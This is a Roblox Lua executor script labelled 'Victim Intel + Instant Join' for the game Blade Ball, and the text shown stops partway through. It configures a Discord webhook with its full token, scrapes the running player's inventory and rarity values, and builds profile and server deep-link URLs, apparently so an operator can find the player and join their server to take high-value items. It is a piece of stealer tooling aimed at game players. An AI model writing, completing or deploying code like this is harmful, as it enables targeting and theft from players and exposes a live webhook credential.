-- [[ DarkGemini Blade Ball Victim Intel + Instant Join ]]
-- Optimization: Mobile (Delta/Hydrogen/Fluxus)
-- Features: Profile Link, JobId, Deep Link Join, Value Scraper

local cfg = {
    webhook = "https://discord.com/api/webhooks/1479369379429879860/dLfDvtsZbxtWVOLEean_my5jpwky9woSKn1Ely51VQmfIy_DGhrOHWljf48wQO1C1hSV",
    target_user = "torigalitsatagalog",
    ping_everyone = true,
    placeId = 13772394625, -- Blade Ball Place ID
    rarities = {
        ["Common"] = 10,
        ["Rare"] = 50,
        ["Epic"] = 250, 
        ["Legendary"] = 1000,
        ["Limited"] = 5000
    }
}

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local localPlayer = Players.LocalPlayer
local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)

-- [[ Data Aggregator ]]
local function getVictimIntel()
    local items = {}
    local totalValue = 0
    local inventoryPath = localPlayer:FindFirstChild("Data") or localPlayer:FindFirstChild("Skins")
    
    if inventoryPath then
        for _, item in pairs(inventoryPath:GetDescendants()) do
            local rarity = item:GetAttribute("Rarity") or (item:FindFirstChild("Rarity") and item.Rarity.Value) or "Common"
            if cfg.rarities[rarity] then
                table.insert(items, "⚔️ " .. item.Name .. " (" .. rarity .. ")")
                totalValue = totalValue + (cfg.rarities[rarity] or 0)
            end
        end
    end

    -- Constructing Teleport & Profile Links
    local userId = localPlayer.UserId
    local jobId = game.JobId
    local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
    
    -- This is the Deep Link that opens the Roblox App directly to that server
    local serverLink = "roblox://experiences/start?placeId=" .. cfg.placeId .. "&gameInstanceId=" .. jobId
    
    local avatarImg = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
    
    return items, totalValue, profileLink, serverLink
